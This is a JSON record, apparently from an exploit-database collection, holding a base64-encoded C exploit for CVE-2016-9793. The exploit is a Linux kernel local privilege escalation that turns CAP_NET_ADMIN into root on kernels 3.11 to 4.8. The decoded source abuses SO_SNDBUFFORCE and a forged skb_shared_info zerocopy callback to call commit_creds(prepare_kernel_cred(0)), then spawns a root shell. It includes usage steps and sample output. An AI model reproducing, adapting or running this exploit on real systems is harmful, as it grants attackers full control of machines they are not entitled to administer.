{
    "source": "exploit-database", 
    "exploit": "Ly8gQ0FQX05FVF9BRE1JTiAtPiByb290IExQRSBleHBsb2l0IGZvciBDVkUtMjAxNi05NzkzDQovLyBObyBLQVNMUiwgU01FUCBvciBTTUFQIGJ5cGFzcyBpbmNsdWRlZA0KLy8gQWZmZWN0ZWQga2VybmVsczogMy4xMSAtPiA0LjgNCi8vIFRlc3RlZCBpbiBRRU1VIG9ubHkNCi8vIGh0dHBzOi8vZ2l0aHViLmNvbS94YWlyeS9rZXJuZWwtZXhwbG9pdHMvdHJlZS9tYXN0ZXIvQ1ZFLTIwMTYtOTc5Mw0KLy8NCi8vIFVzYWdlOg0KLy8gIyBnY2MgLXB0aHJlYWQgZXhwbG9pdC5jIC1vIGV4cGxvaXQNCi8vICMgY2hvd24gZ3Vlc3Q6Z3Vlc3QgZXhwbG9pdA0KLy8gIyBzZXRjYXAgY2FwX25ldF9hZG1pbitlcCAuL2V4cGxvaXQNCi8vICMgc3UgZ3Vlc3QNCi8vICQgd2hvYW1pDQovLyBndWVzdA0KLy8gJCAuL2V4cGxvaXQNCi8vIFsuXSB1c2Vyc3BhY2UgcGF5bG9hZCBtbWFwcGVkIGF0IDB4ZmZmZmYwMDANCi8vIFsuXSBvdmVyd3JpdGluZyB0aHJlYWQgc3RhcnRlZA0KLy8gWy5dIHNvY2tldHMgb3BlbmVkDQovLyBbLl0gc29jay0+c2tfc25kYnVmIHNldCB0byBmZmZmZmUwMA0KLy8gWy5dIHdyaXRpbmcgdG8gc29ja2V0DQovLyBbK10gZ290IHIwMHQNCi8vICMgd2hvYW1pDQovLyByb290DQovLw0KLy8gQW5kcmV5IEtvbm92YWxvdiA8YW5kcmV5a252bEBnbWFpbC5jb20+DQoNCiNkZWZpbmUgX0dOVV9TT1VSQ0UNCg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvc3RhdC5oPg0KI2luY2x1ZGUgPHN5cy90aW1lLmg+DQojaW5jbHVkZSA8c3lzL3R5cGVzLmg+DQojaW5jbHVkZSA8c3lzL3dhaXQuaD4NCiNpbmNsdWRlIDxzeXMvbW1hbi5oPg0KDQojaW5jbHVkZSA8cHRocmVhZC5oPg0KI2luY2x1ZGUgPHNpZ25hbC5oPg0KI2luY2x1ZGUgPHN0ZGFyZy5oPg0KI2luY2x1ZGUgPHN0ZGRlZi5oPg0KI2luY2x1ZGUgPHN0ZGludC5oPg0KI2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RkbGliLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQoNCiNkZWZpbmUgQ09NTUlUX0NSRURTIDB4ZmZmZmZmZmY4MTA3OTg2MHVsDQojZGVmaW5lIFBSRVBBUkVfS0VSTkVMX0NSRUQgMHhmZmZmZmZmZjgxMDc5YjIwdWwNCg0KdHlwZWRlZiBpbnQgX19hdHRyaWJ1dGVfXygocmVncGFybSgzKSkpICgqIF9jb21taXRfY3JlZHMpKHVuc2lnbmVkIGxvbmcgY3JlZCk7DQp0eXBlZGVmIHVuc2lnbmVkIGxvbmcgX19hdHRyaWJ1dGVfXygocmVncGFybSgzKSkpICgqIF9wcmVwYXJlX2tlcm5lbF9jcmVkKSh1bnNpZ25lZCBsb25nIGNyZWQpOw0KDQpfY29tbWl0X2NyZWRzIGNvbW1pdF9jcmVkcyA9IChfY29tbWl0X2NyZWRzKUNPTU1JVF9DUkVEUzsNCl9wcmVwYXJlX2tlcm5lbF9jcmVkIHByZXBhcmVfa2VybmVsX2NyZWQgPSAoX3ByZXBhcmVfa2VybmVsX2NyZWQpUFJFUEFSRV9LRVJORUxfQ1JFRDsNCg0Kdm9pZCBnZXRfcm9vdCh2b2lkKSB7DQogCWNvbW1pdF9jcmVkcyhwcmVwYXJlX2tlcm5lbF9jcmVkKDApKTsNCn0NCg0Kc3RydWN0IHVidWZfaW5mb190IHsNCiAgdWludDY0X3QgY2FsbGJhY2s7ICAgICAgICAvLyB2b2lkICgqY2FsbGJhY2spKHN0cnVjdCB1YnVmX2luZm8gKiwgYm9vbCkNCiAgdWludDY0X3QgY3R4OyAgICAgICAgICAgICAvLyB2b2lkICoNCiAgdWludDY0X3QgZGVzYzsgICAgICAgICAgICAvLyB1bnNpZ25lZCBsb25nDQp9Ow0KDQpzdHJ1Y3Qgc2tiX3NoYXJlZF9pbmZvX3Qgew0KICB1aW50OF90ICBucl9mcmFnczsgICAgICAgIC8vIHVuc2lnbmVkIGNoYXINCiAgdWludDhfdCAgdHhfZmxhZ3M7ICAgICAgICAvLyBfX3U4DQogIHVpbnQxNl90IGdzb19zaXplOyAgICAgICAgLy8gdW5zaWduZWQgc2hvcnQNCiAgdWludDE2X3QgZ3NvX3NlZ3M7ICAgICAgICAvLyB1bnNpZ25lZCBzaG9ydA0KICB1aW50MTZfdCBnc29fdHlwZTsgICAgICAgIC8vIHVuc2lnbmVkIHNob3J0DQogIHVpbnQ2NF90IGZyYWdfbGlzdDsgICAgICAgLy8gc3RydWN0IHNrX2J1ZmYgKg0KICB1aW50NjRfdCBod3RzdGFtcHM7ICAgICAgIC8vIHN0cnVjdCBza2Jfc2hhcmVkX2h3dHN0YW1wcw0KICB1aW50MzJfdCB0c2tleTsgICAgICAgICAgIC8vIHUzMg0KICB1aW50MzJfdCBpcDZfZnJhZ19pZDsgICAgIC8vIF9fYmUzMg0KICB1aW50MzJfdCBkYXRhcmVmOyAgICAgICAgIC8vIGF0b21pY190DQogIHVpbnQ2NF90IGRlc3RydWN0b3JfYXJnOyAgLy8gdm9pZCAqDQogIHVpbnQ4X3QgIGZyYWdzWzE2XVsxN107ICAgLy8gc2tiX2ZyYWdfdCBmcmFnc1tNQVhfU0tCX0ZSQUdTXTsNCn07DQoNCi8vIHNrX3NuZGJ1ZiA9IDB4ZmZmZmZmMDAgPT4gc2tiX3NoaW5mbyhza2IpID0gMHgwMDAwMDAwMGZmZmZmZWQwDQojZGVmaW5lIFNOREJVRiAweGZmZmZmZjAwDQojZGVmaW5lIFNISU5GTyAweDAwMDAwMDAwZmZmZmZlZDB1bA0KDQpzdHJ1Y3QgdWJ1Zl9pbmZvX3QgdWJ1Zl9pbmZvID0geyh1aW50NjRfdCkmZ2V0X3Jvb3QsIDAsIDB9Ow0KLy9zdHJ1Y3QgdWJ1Zl9pbmZvX3QgdWJ1Zl9pbmZvID0gezB4ZmZmZmRlYWRkZWFkYmVlZnVsLCAwLCAwfTsNCnN0cnVjdCBza2Jfc2hhcmVkX2luZm9fdCAqc2tiX3NoYXJlZF9pbmZvID0gKHN0cnVjdCBza2Jfc2hhcmVkX2luZm9fdCAqKVNISU5GTzsNCg0KI2RlZmluZSBTS0JUWF9ERVZfWkVST0NPUFkgKDEgPDwgMykNCg0Kdm9pZCogc2tiX3Rocih2b2lkKiBhcmcpIHsNCgl3aGlsZSAoMSkgew0KCQlza2Jfc2hhcmVkX2luZm8tPmRlc3RydWN0b3JfYXJnID0gKHVpbnQ2NF90KSZ1YnVmX2luZm87DQoJCXNrYl9zaGFyZWRfaW5mby0+dHhfZmxhZ3MgfD0gU0tCVFhfREVWX1pFUk9DT1BZOw0KCX0NCn0NCg0KaW50IHNvY2tldHNbMl07DQoNCnZvaWQgKndyaXRlX3Rocih2b2lkICphcmcpIHsNCgkvLyBXcml0ZSBibG9ja3MgdW50aWwgc2V0c29ja29wdChTT19TTkRCVUYpLg0KCXdyaXRlKHNvY2tldHNbMV0sICJceDVjIiwgMSk7DQoNCglpZiAoZ2V0dWlkKCkgPT0gMCkgew0KCQlwcmludGYoIlsrXSBnb3QgcjAwdFxuIik7DQoJCWV4ZWNsKCIvYmluL2Jhc2giLCAiYmFzaCIsIE5VTEwpOw0KCQlwZXJyb3IoImV4ZWNsKCkiKTsNCgl9DQoJcHJpbnRmKCJbLV0gc29tZXRoaW5nIHdlbnQgd3JvbmdcbiIpOw0KfQ0KDQppbnQgbWFpbigpIHsNCgl2b2lkICphZGRyOw0KCWludCBydjsNCgl1aW50MzJfdCBzbmRidWY7DQoNCglhZGRyID0gbW1hcCgodm9pZCAqKShTSElORk8gJiAweGZmZmZmZmZmZmZmZmYwMDB1bCksIDB4MTAwMHVsLA0KCQlQUk9UX1JFQUQgfCBQUk9UX1dSSVRFLCBNQVBfRklYRUQgfCBNQVBfQU5PTllNT1VTIHwgTUFQX1BSSVZBVEUsDQoJCS0xLCAwKTsNCglpZiAoYWRkciAhPSAodm9pZCAqKShTSElORk8gJiAweGZmZmZmZmZmZmZmZmYwMDB1bCkpIHsNCgkJcGVycm9yKCJtbWFwKCkiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCg0KCXByaW50ZigiWy5dIHVzZXJzcGFjZSBwYXlsb2FkIG1tYXBwZWQgYXQgJXBcbiIsIGFkZHIpOw0KDQogCXB0aHJlYWRfdCBza2JfdGg7DQogICAgCXJ2ID0gcHRocmVhZF9jcmVhdGUoJnNrYl90aCwgMCwgc2tiX3RociwgTlVMTCk7DQoJaWYgKHJ2ICE9IDApIHsNCgkJcGVycm9yKCJwdGhyZWFkX2NyZWF0ZSgpIik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQogICAgCXVzbGVlcCgxMDAwMCk7DQoNCglwcmludGYoIlsuXSBvdmVyd3JpdGluZyB0aHJlYWQgc3RhcnRlZFxuIik7DQoNCglydiA9IHNvY2tldHBhaXIoQUZfTE9DQUwsIFNPQ0tfU1RSRUFNLCAwLCAmc29ja2V0c1swXSk7DQoJaWYgKHJ2ICE9IDApIHsNCgkJcGVycm9yKCJzb2NrZXRwYWlyKCkiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCg0KCXByaW50ZigiWy5dIHNvY2tldHMgb3BlbmVkXG4iKTsNCg0KCXNuZGJ1ZiA9IFNOREJVRjsNCglydiA9IHNldHNvY2tvcHQoc29ja2V0c1sxXSwgU09MX1NPQ0tFVCwgU09fU05EQlVGRk9SQ0UsDQoJCQkmc25kYnVmLCBzaXplb2Yoc25kYnVmKSk7DQoJaWYgKHJ2ICE9IDApIHsNCgkJcGVycm9yKCJzZXRzb2Nrb3B0KCkiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCg0KCXByaW50ZigiWy5dIHNvY2stPnNrX3NuZGJ1ZiBzZXQgdG8gJXhcbiIsIFNOREJVRiAqIDIpOw0KDQoJcHRocmVhZF90IHdyaXRlX3RoOw0KCXJ2ID0gcHRocmVhZF9jcmVhdGUoJndyaXRlX3RoLCAwLCB3cml0ZV90aHIsIE5VTEwpOw0KCWlmIChydiAhPSAwKSB7DQoJCXBlcnJvcigicHRocmVhZF9jcmVhdGUoKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KCXVzbGVlcCgxMDAwMCk7DQoNCglwcmludGYoIlsuXSB3cml0aW5nIHRvIHNvY2tldFxuIik7DQoNCgkvLyBXYWtlIHVwIGJsb2NrZWQgd3JpdGUuDQoJcnYgPSBzZXRzb2Nrb3B0KHNvY2tldHNbMV0sIFNPTF9TT0NLRVQsIFNPX1NOREJVRiwNCgkJCSZzbmRidWYsIHNpemVvZihzbmRidWYpKTsNCglpZiAocnYgIT0gMCkgew0KCQlwZXJyb3IoInNldHNvY2tvcHQoKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KCXVzbGVlcCgxMDAwMCk7DQoNCgljbG9zZShzb2NrZXRzWzBdKTsNCgljbG9zZShzb2NrZXRzWzFdKTsNCg0KCXJldHVybiAwOw0KfQ==", 
    "filename": "platforms/linux/local/41995.c", 
    "id": "41995", 
    "cves": [
        "CVE-2016-9793"
    ]
}